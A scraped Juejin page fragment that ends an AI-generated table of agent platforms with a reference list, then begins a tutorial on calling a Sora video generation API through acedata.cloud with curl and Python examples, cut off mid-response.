<table><thead><tr><th align="left">序号</th><th align="left">平台名称</th><th align="left">核心特点</th><th align="left">适用场景</th></tr></thead><tbody><tr><td align="left">11</td><td align="left">OpenMAS</td><td align="left">多智能体模拟器，基于MATLAB框架</td><td align="left">教学仿真、机器人协同</td></tr><tr><td align="left">12</td><td align="left">LangGraph</td><td align="left">生产级图编排框架，支持检查点与中断机制</td><td align="left">复杂工作流、长程任务执行</td></tr><tr><td align="left">13</td><td align="left">AgentForge</td><td align="left">可配置认知架构，支持行为引擎自定义</td><td align="left">自主决策系统、AI训练</td></tr><tr><td align="left">14</td><td align="left">Adala</td><td align="left">自主数据标注智能体，闭环学习优化</td><td align="left">数据清洗、模型微调</td></tr><tr><td align="left">15</td><td align="left">OpenClaw</td><td align="left">24/7本地个人AI助手，集成多应用技能</td><td align="left">个人知识管理、跨平台自动化</td></tr><tr><td align="left">16</td><td align="left">Onyx</td><td align="left">多模型兼容聊天平台，支持文件系统集成</td><td align="left">企业AI助手、RAG应用</td></tr><tr><td align="left">17</td><td align="left">Hello-Agents</td><td align="left">教程型框架，适合从零构建智能体</td><td align="left">教学、原型开发</td></tr><tr><td align="left">18</td><td align="left">OpenCode</td><td align="left">模型无关编码代理，支持LSP协议</td><td align="left">代码理解、调试与重构</td></tr><tr><td align="left">19</td><td align="left">Superpowers</td><td align="left">结构化AI编程技能库，插件化设计</td><td align="left">工程化编码流程</td></tr><tr><td align="left">20</td><td align="left">Dify</td><td align="left">低代码平台，支持可视化编排与私有化部署</td><td align="left">快速构建AI应用，非技术用户友好</td></tr></tbody></table>
<hr/>
<p>21–30：新兴与垂直领域平台</p>







































































<table><thead><tr><th align="left">序号</th><th align="left">平台名称</th><th align="left">核心特点</th><th align="left">适用场景</th></tr></thead><tbody><tr><td align="left">21</td><td align="left">ooderAI</td><td align="left">分布式SuperAgent管理平台，支持A2A通信</td><td align="left">企业AI技能调度、智能体协同</td></tr><tr><td align="left">22</td><td align="left">OoderNexus</td><td align="left">P2P-AIBridge可视化平台，支持SkillFlow编排</td><td align="left">本地AI代理控制、设备能力接入</td></tr><tr><td align="left">23</td><td align="left">Dive</td><td align="left">开源MCP主机桌面应用，TypeScript + Rust构建</td><td align="left">LLM函数调用、跨平台代理</td></tr><tr><td align="left">24</td><td align="left">Clawdbot (Moltbot)</td><td align="left">MIT协议托管GitHub，持续运行个人AI</td><td align="left">长期任务处理、偏好记忆</td></tr><tr><td align="left">25</td><td align="left">AgentScope</td><td align="left">多智能体通信中间件，基于消息队列</td><td align="left">实验性多智能体系统开发</td></tr><tr><td align="left">26</td><td align="left">MindForge</td><td align="left">基于ACT-R认知模型的智能体引擎</td><td align="left">教育AI、心理模拟、认知建模</td></tr><tr><td align="left">27</td><td align="left">AutoScripter</td><td align="left">自动化脚本生成智能体，支持Shell/Python</td><td align="left">系统运维、批量任务</td></tr><tr><td align="left">28</td><td align="left">DocuAgent</td><td align="left">文档智能体协作系统，支持PDF/Word解析</td><td align="left">合同审查、学术综述</td></tr><tr><td align="left">29</td><td align="left">CodeSage</td><td align="left">编程导师型智能体，具备错误诊断能力</td><td align="left">编程教学、代码审查</td></tr><tr><td align="left">30</td><td align="left">PlanIt</td><td align="left">基于强化学习的任务规划智能体</td><td align="left">个人日程管理、项目排期</td></tr></tbody></table>
<blockquote>
<p>所有平台均确认采用 MIT 开源许可证，允许自由使用、修改与商业分发，仅需保留原始版权声明。undefined其中 Dify、Yuxi-Know、OpenClaw 由国内团队主导开发，中文文档完善，适配通义千问、讯飞星火等国产大模型，已在教育、金融、政务等领域落地应用。</p>
</blockquote>
<hr/>
<p>要不要我生成一份可导出的CSV清单，方便你导入到项目管理系统中进行技术选型？
参考资料
1(<a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.jsw.com.cn%2F2025%2F1119%2F1932570.shtml" target="_blank" title="https://www.jsw.com.cn/2025/1119/1932570.shtml" ref="nofollow noopener noreferrer">www.jsw.com.cn/2025/1119/1…</a>)
2(<a href="https://link.juejin.cn?target=https%3A%2F%2Fcloud.tencent.com%2Fdeveloper%2Farticle%2F2238196" target="_blank" title="https://cloud.tencent.com/developer/article/2238196" ref="nofollow noopener noreferrer">cloud.tencent.com/developer/a…</a>)
3(<a href="https://link.juejin.cn?target=https%3A%2F%2Fweibo.com%2F2630692550%2FPnq9jvfeN" target="_blank" title="https://weibo.com/2630692550/Pnq9jvfeN" ref="nofollow noopener noreferrer">weibo.com/2630692550/…</a>)
4(<a href="https://link.juejin.cn?target=https%3A%2F%2Fkw.beijing.gov.cn%2Fxwdt%2Fkcyx%2Fxwdtcyfz%2F202507%2Ft20250731_4162951.html" target="_blank" title="https://kw.beijing.gov.cn/xwdt/kcyx/xwdtcyfz/202507/t20250731_4162951.html" ref="nofollow noopener noreferrer">kw.beijing.gov.cn/xwdt/kcyx/x…</a>)
5(<a href="https://link.juejin.cn?target=https%3A%2F%2Fbaijiahao.baidu.com%2Fs%3Fid%3D1829983090696760629%26wfr%3Dspider%26for%3Dpc" target="_blank" title="https://baijiahao.baidu.com/s?id=1829983090696760629&amp;wfr=spider&amp;for=pc" ref="nofollow noopener noreferrer">baijiahao.baidu.com/s?id=182998…</a>)
6(<a href="https://link.juejin.cn?target=https%3A%2F%2Fzhuanlan.zhihu.com%2Fp%2F1911743576762737609" target="_blank" title="https://zhuanlan.zhihu.com/p/1911743576762737609" ref="nofollow noopener noreferrer">zhuanlan.zhihu.com/p/191174357…</a>)
7(<a href="https://link.juejin.cn?target=https%3A%2F%2Fblog.csdn.net%2Fu011712942%2Farticle%2Fdetails%2F150269725" target="_blank" title="https://blog.csdn.net/u011712942/article/details/150269725" ref="nofollow noopener noreferrer">blog.csdn.net/u011712942/…</a>)
8(<a href="https://link.juejin.cn?target=https%3A%2F%2Fbaijiahao.baidu.com%2Fs%3Fid%3D1838616786578499470%26wfr%3Dspider%26for%3Dpc" target="_blank" title="https://baijiahao.baidu.com/s?id=1838616786578499470&amp;wfr=spider&amp;for=pc" ref="nofollow noopener noreferrer">baijiahao.baidu.com/s?id=183861…</a>)
9(<a href="https://link.juejin.cn?target=https%3A%2F%2Ftech.ifeng.com%2Fc%2F8iPfUJ6dDp3" target="_blank" title="https://tech.ifeng.com/c/8iPfUJ6dDp3" ref="nofollow noopener noreferrer">tech.ifeng.com/c/8iPfUJ6dD…</a>)
10(<a href="https://link.juejin.cn?target=https%3A%2F%2Fcaifuhao.eastmoney.com%2Fnews%2F20250408093303406013770" target="_blank" title="https://caifuhao.eastmoney.com/news/20250408093303406013770" ref="nofollow noopener noreferrer">caifuhao.eastmoney.com/news/202504…</a>)
11(<a href="https://link.juejin.cn?target=https%3A%2F%2Fblog.csdn.net%2Fm0_59164520%2Farticle%2Fdetails%2F156335625" target="_blank" title="https://blog.csdn.net/m0_59164520/article/details/156335625" ref="nofollow noopener noreferrer">blog.csdn.net/m0_59164520…</a>)
12(<a href="https://link.juejin.cn?target=http%3A%2F%2Fwww.bilibili.com%2Fvideo%2FBV1EGKzzgEDR" target="_blank" title="http://www.bilibili.com/video/BV1EGKzzgEDR" ref="nofollow noopener noreferrer">www.bilibili.com/video/BV1EG…</a>)
13(<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2FSpaceX-mit%2FOpenHarmony" target="_blank" title="https://github.com/SpaceX-mit/OpenHarmony" ref="nofollow noopener noreferrer">github.com/SpaceX-mit/…</a>)
14(<a href="https://link.juejin.cn?target=https%3A%2F%2Fzhuanlan.zhihu.com%2Fp%2F683559813" target="_blank" title="https://zhuanlan.zhihu.com/p/683559813" ref="nofollow noopener noreferrer">zhuanlan.zhihu.com/p/683559813</a>)
15(<a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.tmtpost.com%2Fbaidu%2F7637978.html" target="_blank" title="https://www.tmtpost.com/baidu/7637978.html" ref="nofollow noopener noreferrer">www.tmtpost.com/baidu/76379…</a>)
16(<a href="https://link.juejin.cn?target=https%3A%2F%2Fhub.baai.ac.cn%2Fview%2F44127" target="_blank" title="https://hub.baai.ac.cn/view/44127" ref="nofollow noopener noreferrer">hub.baai.ac.cn/view/44127</a>)
17(<a href="https://link.juejin.cn?target=https%3A%2F%2Fblog.csdn.net%2F2401_85343303%2Farticle%2Fdetails%2F149712728" target="_blank" title="https://blog.csdn.net/2401_85343303/article/details/149712728" ref="nofollow noopener noreferrer">blog.csdn.net/2401_853433…</a>)
18(<a href="https://link.juejin.cn?target=https%3A%2F%2Fstock.10jqka.com.cn%2F20251124%2Fc672699101.shtml" target="_blank" title="https://stock.10jqka.com.cn/20251124/c672699101.shtml" ref="nofollow noopener noreferrer">stock.10jqka.com.cn/20251124/c6…</a>)
19(<a href="https://link.juejin.cn?target=https%3A%2F%2Fhub-assets-cache.baai.ac.cn%2F" target="_blank" title="https://hub-assets-cache.baai.ac.cn/" ref="nofollow noopener noreferrer">hub-assets-cache.baai.ac.cn/</a>)
20(<a href="https://link.juejin.cn?target=https%3A%2F%2Fhub-assets-cache.baai.ac.cn%2Fview%2F52328" target="_blank" title="https://hub-assets-cache.baai.ac.cn/view/52328" ref="nofollow noopener noreferrer">hub-assets-cache.baai.ac.cn/view/52328</a>)
21(<a href="https://link.juejin.cn?target=https%3A%2F%2Fdeveloper.aliyun.com%2Farticle%2F1673338" target="_blank" title="https://developer.aliyun.com/article/1673338" ref="nofollow noopener noreferrer">developer.aliyun.com/article/167…</a>)
22(<a href="https://link.juejin.cn?target=https%3A%2F%2Ft.10jqka.com.cn%2Fpid_481689197.shtml" target="_blank" title="https://t.10jqka.com.cn/pid_481689197.shtml" ref="nofollow noopener noreferrer">t.10jqka.com.cn/pid_4816891…</a>)
23(<a href="https://link.juejin.cn?target=https%3A%2F%2Fcloud.tencent.com%2Fdeveloper%2Fnews%2F2540807" target="_blank" title="https://cloud.tencent.com/developer/news/2540807" ref="nofollow noopener noreferrer">cloud.tencent.com/developer/n…</a>)
24(<a href="https://link.juejin.cn?target=https%3A%2F%2Fblog.csdn.net%2Fddffhhvbnk%2Farticle%2Fdetails%2F156279059" target="_blank" title="https://blog.csdn.net/ddffhhvbnk/article/details/156279059" ref="nofollow noopener noreferrer">blog.csdn.net/ddffhhvbnk/…</a>)
25(<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fhangeaiagent%2FAI-Resources-Central" target="_blank" title="https://github.com/hangeaiagent/AI-Resources-Central" ref="nofollow noopener noreferrer">github.com/hangeaiagen…</a>)
26(<a href="https://link.juejin.cn?target=https%3A%2F%2Fhub.baai.ac.cn%2Fview%2F33852" target="_blank" title="https://hub.baai.ac.cn/view/33852" ref="nofollow noopener noreferrer">hub.baai.ac.cn/view/33852</a>)
27(<a href="https://link.juejin.cn?target=https%3A%2F%2Fm.ithome.com%2Fhtml%2F917446.htm" target="_blank" title="https://m.ithome.com/html/917446.htm" ref="nofollow noopener noreferrer">m.ithome.com/html/917446…</a>)
28(<a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.jmnews.cn%2Fzxsq%2F784.shtml" target="_blank" title="https://www.jmnews.cn/zxsq/784.shtml" ref="nofollow noopener noreferrer">www.jmnews.cn/zxsq/784.sh…</a>)
29(<a href="https://link.juejin.cn?target=https%3A%2F%2Fbaijiahao.baidu.com%2Fs%3Fid%3D1836426199175728180%26wfr%3Dspider%26for%3Dpc" target="_blank" title="https://baijiahao.baidu.com/s?id=1836426199175728180&amp;wfr=spider&amp;for=pc" ref="nofollow noopener noreferrer">baijiahao.baidu.com/s?id=183642…</a>)
30(<a href="https://link.juejin.cn?target=https%3A%2F%2Fblog.csdn.net%2Fqiuzhqp%2Farticle%2Fdetails%2F154074745" target="_blank" title="https://blog.csdn.net/qiuzhqp/article/details/154074745" ref="nofollow noopener noreferrer">blog.csdn.net/qiuzhqp/art…</a>)
31(<a href="https://link.juejin.cn?target=https%3A%2F%2Fgitee.com%2Fmetmit" target="_blank" title="https://gitee.com/metmit" ref="nofollow noopener noreferrer">gitee.com/metmit</a>)</p>
<p>百度AI生成，内容仅供参考</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Sora Videos Generation API 对接说明]]></title>    <link>https://juejin.cn/post/7602991346585976866</link>    <guid>https://juejin.cn/post/7602991346585976866</guid>    <pubDate>2026-02-05T13:57:15.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7602991346585976866" data-draft-id="7603195960254758912" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Sora Videos Generation API 对接说明"/> <meta itemprop="keywords" content="后端,API,Sora"/> <meta itemprop="datePublished" content="2026-02-05T13:57:15.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="崔庆才丨静觅"/> <meta itemprop="url" content="https://juejin.cn/user/1521379821230269"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Sora Videos Generation API 对接说明
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1521379821230269/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    崔庆才丨静觅
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-02-05T13:57:15.000Z" title="Thu Feb 05 2026 13:57:15 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-02-05
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读7分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>本文将介绍一种 Sora Videos Generation API 对接说明，它是可以通过输入自定义参数来生成Sora官方的视频。</p>
<h2 data-id="heading-0">申请流程</h2>
<p>要使用 API，需要先到 <a href="https://link.juejin.cn?target=https%3A%2F%2Fplatform.acedata.cloud%2Fdocuments%2F99a24421-2e22-4028-8201-e19cb834b67e" target="_blank" title="https://platform.acedata.cloud/documents/99a24421-2e22-4028-8201-e19cb834b67e" ref="nofollow noopener noreferrer">Sora Videos Generation API</a> 对应页面申请对应的服务，进入页面之后，点击「Acquire」按钮，如图所示：</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/43dbbd451a844a6d855cf9512e1fab4f~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5bSU5bqG5omN5Lio6Z2Z6KeF:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770904635&amp;x-signature=tWZ9Ng75aDVGB0QzjM8IQPkvRF0%3D" alt="" loading="lazy"/></p>
<p>如果你尚未登录或注册，会自动跳转到登录页面邀请您来注册和登录，登录注册之后会自动返回当前页面。</p>
<p>在首次申请时会有免费额度赠送，可以免费使用该 API。</p>
<h2 data-id="heading-1">基本使用</h2>
<p>首先先了解下基本的使用方式，就是输入提示词 <code>prompt</code>、参考图片链接数组 <code>image_urls</code> 以及模型 <code>model</code>，便可获得处理后的结果，具体的内容如下：</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/5572e9ef80664a04bc57fcc9a03cd36a~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5bSU5bqG5omN5Lio6Z2Z6KeF:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770904635&amp;x-signature=dHp0XZihMUUBdrE%2FmmSo6bFVUq0%3D" width="500" class="m-auto" loading="lazy"/></p>
<p>可以看到这里我们设置了 Request Headers，包括：</p>
<ul>
<li><code>accept</code>：想要接收怎样格式的响应结果，这里填写为 <code>application/json</code>，即 JSON 格式。</li>
<li><code>authorization</code>：调用 API 的密钥，申请之后可以直接下拉选择。</li>
</ul>
<p>另外设置了 Request Body，包括：</p>
<ul>
<li><code>model</code>：生成视频的模型，主要有<code>sora-2</code>、<code>sora-2-pro</code>，目前 <code>sora-2</code>、<code>sora-2-pro</code>可以自主选择<code>size</code>、<code>duration</code>参数的视频，其中<code>sora-2-pro</code>可以支持<code>duration</code>为25s的视频，而<code>sora-2</code>只支持10、15秒的视频。</li>
<li><code>size</code>：此次视频生成任务的清晰度，分别有 <code>small</code> 、 <code>large</code>。</li>
<li><code>image_urls</code>：需要上传的参考图片链接或者Base64编码数组。</li>
<li><code>duration</code>：此次视频生成任务的时长，分别有10s、15s、25s，目前只有<code>sora-2-pro</code>支持25s。</li>
<li><code>character_start</code>/<code>character_end</code>：角色在画面中的起止位置（0-1），用于控制主体位置。</li>
<li><code>orientation</code>：画幅方向，支持 <code>landscape</code>、<code>portrait</code>、<code>square</code>。</li>
<li><code>prompt</code>：提示词。</li>
<li><code>callback_url</code>：需要回调结果的URL。</li>
</ul>
<p>选择之后，可以发现右侧也生成了对应代码，如图所示：</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/82273bd8e87f43228599b53a70c24118~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5bSU5bqG5omN5Lio6Z2Z6KeF:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770904635&amp;x-signature=DGb7JKjNy1A8SNvEB4h0rm4xYrE%3D" width="500" class="m-auto" loading="lazy"/></p>
<p>点击「Try」按钮即可进行测试，如上图所示，这里我们就得到了如下结果：</p>
<pre><code class="hljs language-json" lang="json"><span class="hljs-punctuation">{</span>
  <span class="hljs-attr">"success"</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">true</span></span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"task_id"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"6bf7fb83-5814-4e3e-a4ad-bfa0c26c0b33"</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"trace_id"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"96166698-4b66-478d-a26b-77a7269c9e01"</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"data"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span>
    <span class="hljs-punctuation">{</span>
      <span class="hljs-attr">"id"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"sora-2:task_01k7770rgsevxsmtpbn7xnm5gh"</span><span class="hljs-punctuation">,</span>
      <span class="hljs-attr">"video_url"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"https://filesystem.site/gptimage/vg-assets/assets%2Ftask_01k7770rgsevxsmtpbn7xnm5gh%2Ftask_01k7770rgsevxsmtpbn7xnm5gh_genid_0bf958d3-cae7-4298-b7b6-99ae439a1ea6_25_10_10_14_06_975715%2Fvideos%2F00000%2Fsrc.mp4?st=2025-10-10T12%3A30%3A38Z&amp;se=2025-10-16T13%3A30%3A38Z&amp;sks=b&amp;skt=2025-10-10T12%3A30%3A38Z&amp;ske=2025-10-16T13%3A30%3A38Z&amp;sktid=a48cca56-e6da-484e-a814-9c849652bcb3&amp;skoid=8ebb0df1-a278-4e2e-9c20-f2d373479b3a&amp;skv=2019-02-02&amp;sv=2018-11-09&amp;sr=b&amp;sp=r&amp;spr=https%2Chttp&amp;sig=jigY6Z5qp8%2BTXYobaW0EAJ4%2Fbx6G7t6V1P0iyDeUq48%3D&amp;az=oaivgprodscus"</span><span class="hljs-punctuation">,</span>
      <span class="hljs-attr">"state"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"succeeded"</span>
    <span class="hljs-punctuation">}</span>
  <span class="hljs-punctuation">]</span>
<span class="hljs-punctuation">}</span>
</code></pre>
<p>返回结果一共有多个字段，介绍如下：</p>
<ul>
<li><code>success</code>，此时视频生成任务的状态情况。</li>
<li><code>task_id</code>，此时视频生成任务ID。</li>
<li><code>trace_id</code>，此时视频生成跟踪ID。</li>
<li><code>data</code>，此时视频生成任务的结果列表。
<ul>
<li><code>id</code>，此时视频生成任务的视频ID。</li>
<li><code>video_url</code>，此时视频生成任务的视频链接。</li>
<li><code>state</code>，此时视频生成任务的状态。</li>
</ul>
</li>
</ul>
<p>可以看到我们得到了满意的视频信息，我们只需要根据结果中 <code>data</code> 的视频链接地址获取生成的Sora视频即可。</p>
<p>另外如果想生成对应的对接代码，可以直接复制生成，例如 CURL 的代码如下：</p>
<pre><code class="hljs language-shell" lang="shell">curl -X POST 'https://api.acedata.cloud/sora/videos' \
-H 'accept: application/json' \
-H 'authorization: Bearer {token}' \
-H 'content-type: application/json' \
-d '{
  "size": "large",
  "duration": 15,
  "orientation": "landscape",
  "prompt": "cat running on the river",
  "model": "sora-2"
}'
</code></pre>
<h2 data-id="heading-2">图生视频任务</h2>
<p>如果想图生视频任务任务， 首先参数<code>image_urls</code>必须传入参考图片链接，就可以指定如下内容：</p>
<ul>
<li>image_urls：该图生视频任务采用的参考图链接数组，。</li>
</ul>
<p>填写样例如下：</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/7a59b879af0d4c2394cfd4b32e9e188f~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5bSU5bqG5omN5Lio6Z2Z6KeF:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770904635&amp;x-signature=pndbYXQzSkIis1YNo4yKGvIe3z4%3D" width="500" class="m-auto" loading="lazy"/></p>
<p>填写完毕之后自动生成了代码如下：</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/d0e9173588fd4cb697c80463cb7781e2~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5bSU5bqG5omN5Lio6Z2Z6KeF:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770904635&amp;x-signature=2Dx4336MyVBd%2BDBfTUAB%2FAuIaSk%3D" width="500" class="m-auto" loading="lazy"/></p>
<p>对应的代码：</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">import</span> requests

url = <span class="hljs-string">"https://api.acedata.cloud/sora/videos"</span>

headers = {
    <span class="hljs-string">"accept"</span>: <span class="hljs-string">"application/json"</span>,
    <span class="hljs-string">"authorization"</span>: <span class="hljs-string">"Bearer {token}"</span>,
    <span class="hljs-string">"content-type"</span>: <span class="hljs-string">"application/json"</span>
}

payload = {
    <span class="hljs-string">"size"</span>: <span class="hljs-string">"large"</span>,
    <span class="hljs-string">"duration"</span>: <span class="hljs-number">15</span>,
    <span class="hljs-string">"orientation"</span>: <span class="hljs-string">"landscape"</span>,
    <span class="hljs-string">"prompt"</span>: <span class="hljs-string">"cat running on the river"</span>,
    <span class="hljs-string">"model"</span>: <span class="hljs-string">"sora-2"</span>,
    <span class="hljs-string">"image_urls"</span>: [<span class="hljs-string">"https://cdn.acedata.cloud/11wfp4.png"</span>]
}

response = requests.post(url, json=payload, headers=headers)
<span class="hljs-built_in">print</span>(response.text)
</code></pre>
<p>点击运行，可以发现会立即得到一个结果，如下：</p>
<pre><code class="hljs language-perl" lang="perl">{
  <span class="hljs-string">"success"</span>: true,
  <span class="hljs-string">"task_id"</span>: <span class="hljs-string">"dd392ff0-dcb7-4c7a-afd0-9bd4f65c803a"</span>,
  <span class="hljs-string">"trace_id"</span>: <span class="hljs-string">"04fd151c-e942-4c1c-a6ab-9a1b1fe54172"</span>,
  <span class="hljs-string">"data"</span>: [
    {
      <span class="hljs-string">"id"</span>: <span class="hljs-string">"sora-2:task_01k777af4hfmg9g7yfvwsc6zws"</span>,
